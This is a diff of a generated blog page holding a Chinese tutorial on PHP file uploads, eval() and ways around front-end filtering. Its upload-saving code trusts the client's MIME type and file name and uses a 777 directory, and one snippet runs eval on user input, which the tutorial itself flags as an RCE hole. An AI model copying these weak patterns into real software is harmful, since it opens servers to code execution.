@@ -6,15 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives | 林姜的博客</title>
+  <title>文件上传 | 林姜的博客</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="林姜的博客">
-<meta property="og:url" content="http://example.com/archives/index.html">
+  <meta name="description" content="文件上传创建一个文件上传表单示例 123456789101112131415&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;form action&#x3D;&quot;upload_fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://example.com/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
 <meta property="og:site_name" content="林姜的博客">
+<meta property="og:description" content="文件上传创建一个文件上传表单示例 123456789101112131415&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;菜鸟教程(runoob.com)&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;form action&#x3D;&quot;upload_fil">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-02-15T14:31:44.000Z">
+<meta property="article:modified_time" content="2025-02-15T14:32:03.467Z">
 <meta property="article:author" content="林姜">
 <meta name="twitter:card" content="summary">
   
@@ -209,298 +213,472 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-文件上传" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2025" class="archive-year">2025</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+    <h1 class="article-title" itemprop="name">
+      文件上传
+    </h1>
+  
+
+
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="archive-article-date">
         <time datetime="2025-02-15T14:31:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-02-15</time>
 </a>
 
-        </div>
-    	 
   
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2025/02/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" target="_blank">文件上传</a>
   
-    </h1>
-  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">3.8k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">17分</span>
+    </span>
+  </span>
+</div>
 
 
-        <div class="article-info info-on-right">
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h2><p>示例</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<ul>
+<li><strong><form></strong> 标签的 <strong>enctype</strong> 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 “<strong>multipart&#x2F;form-data</strong>“。</li>
+<li><strong><input></strong> 标签的 <strong>type&#x3D;”file”</strong> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li>
+</ul>
+<h2 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h2><p>示例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p>
+<p>第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：</p>
+<ul>
+<li>$_FILES[“file”][“name”] - 上传文件的名称</li>
+<li>$_FILES[“file”][“type”] - 上传文件的类型</li>
+<li>$_FILES[“file”][“size”] - 上传文件的大小，以字节计</li>
+<li>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称</li>
+<li>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</li>
+</ul>
+<h2 id="上传限制"><a href="#上传限制" class="headerlink" title="上传限制"></a>上传限制</h2><p>如只能上传 .gif、.jpeg、.jpg、.png 文件，文件大小必须小于 200 kB：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);        <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>)    <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错误：: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;非法的文件格式&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="保存被上传的文件"><a href="#保存被上传的文件" class="headerlink" title="保存被上传的文件"></a>保存被上传的文件</h2><p>示例在服务器的 PHP 临时文件夹中创建了一个被上传文件的临时副本。</p>
+<p>这个临时的副本文件会在脚本结束时消失。要保存被上传的文件，我们需要把它拷贝到另外的位置：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 允许上传的图片后缀</span></span><br><span class="line"><span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/gif&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/x-png&quot;</span>)</span><br><span class="line">|| (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>))</span><br><span class="line">&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;错误：: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 判断当前目录下的 upload 目录是否存在该文件</span></span><br><span class="line">        <span class="comment">// 如果没有 upload 目录，你需要创建它，upload 目录权限为 777</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件存储在: &quot;</span> . <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;非法的文件格式&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="eval用法"><a href="#eval用法" class="headerlink" title="eval用法"></a>eval用法</h2><h3 id="eval-的用法：将字符串作为-PHP-代码执行"><a href="#eval-的用法：将字符串作为-PHP-代码执行" class="headerlink" title="eval() 的用法：将字符串作为 PHP 代码执行"></a><strong><code>eval()</code> 的用法：将字符串作为 PHP 代码执行</strong></h3><p>在 PHP 中，<code>eval()</code> 是一个内置函数，可以执行字符串形式的 PHP 代码。例如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;Hello, World!&#x27;;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上面的代码等价于：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello, World!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>eval()</code> 会解析并执行传入的字符串，<strong>但它不能执行完整的 PHP 代码文件</strong>，即不能包含 <code>&lt;?php ?&gt;</code> 标签。</p>
+<hr>
+<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a><strong>常见问题</strong></h3><h4 id="1-语句末尾必须有"><a href="#1-语句末尾必须有" class="headerlink" title="1. 语句末尾必须有 ;"></a><strong>1. 语句末尾必须有 <code>;</code></strong></h4><p><code>eval()</code> 传入的字符串 <strong>必须是完整的 PHP 语句</strong>，末尾必须有 <code>;</code>，否则会报错：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;Hello, World!&#x27;&quot;</span>); <span class="comment">// ❌ 语法错误，缺少 ;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正确写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;Hello, World!&#x27;;&quot;</span>); <span class="comment">// ✅ 正确</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="2-单引号-与-双引号-转义问题"><a href="#2-单引号-与-双引号-转义问题" class="headerlink" title="2. 单引号 &#39;&#39; 与 双引号 &quot;&quot; 转义问题"></a><strong>2. 单引号 <code>&#39;&#39;</code> 与 双引号 <code>&quot;&quot;</code> 转义问题</strong></h4><p><code>eval()</code> 传入的字符串本身就是代码，因此如果代码中包含引号，可能需要 <strong>正确转义</strong>：</p>
+<p><strong>示例 1：使用双引号包裹代码字符串</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo &#x27;Hello, World!&#x27;;&quot;</span>); <span class="comment">// ✅ 代码中的单引号不会影响外层双引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 2：使用单引号包裹代码字符串</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &quot;Hello, World!&quot;;&#x27;</span>); <span class="comment">// ✅ 代码中的双引号不会影响外层单引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 3：当代码字符串和内部字符串相同时，必须转义</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo \&quot;Hello, &#x27;PHP&#x27;!\&quot;;&quot;</span>); <span class="comment">// ✅ 使用 \&quot; 转义</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo \&#x27;Hello, &quot;PHP&quot;!\&#x27; ;&#x27;</span>); <span class="comment">// ✅ 使用 \&#x27; 转义</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 4：避免转义问题，可以用 <code>heredoc</code> 语法</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">echo &quot;Hello, &#x27;PHP&#x27;!&quot;;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就不需要手动转义引号了。</p>
+<hr>
+<h3 id="3-变量注入"><a href="#3-变量注入" class="headerlink" title="3. 变量注入"></a><strong>3. 变量注入</strong></h3><p>如果 <code>eval()</code> 处理的是用户输入，可能会导致 <strong>代码执行漏洞</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user_input</span> = <span class="string">&quot;phpinfo();&quot;</span>; <span class="comment">// 假设用户输入</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$user_input</span>); <span class="comment">// 直接执行</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果 <code>eval()</code> 处理不受控的用户输入，攻击者可能执行任意 PHP 代码，造成严重的 <strong>远程代码执行（RCE）</strong> 漏洞。因此，在安全开发中 **尽量避免使用 <code>eval()</code>**。</p>
+<h2 id="前端的过滤绕过方法"><a href="#前端的过滤绕过方法" class="headerlink" title="前端的过滤绕过方法"></a>前端的过滤绕过方法</h2><h3 id="1-绕过-JavaScript-过滤"><a href="#1-绕过-JavaScript-过滤" class="headerlink" title="1. 绕过 JavaScript 过滤"></a><strong>1. 绕过 JavaScript 过滤</strong></h3><p><strong>前端 JavaScript 过滤并不可靠</strong>，因为攻击者可以：</p>
+<ul>
+<li><strong>禁用 JavaScript</strong>（使用浏览器开发者工具）</li>
+<li><strong>修改 HTML 代码</strong>（删除 <code>maxlength</code> 限制）</li>
+<li><strong>拦截请求并修改数据</strong>（使用 Burp Suite、Postman）</li>
+<li><strong>F12 控制台直接修改表单数据</strong></li>
+<li><strong>使用 <code>curl</code>、Python 发送数据</strong></li>
+</ul>
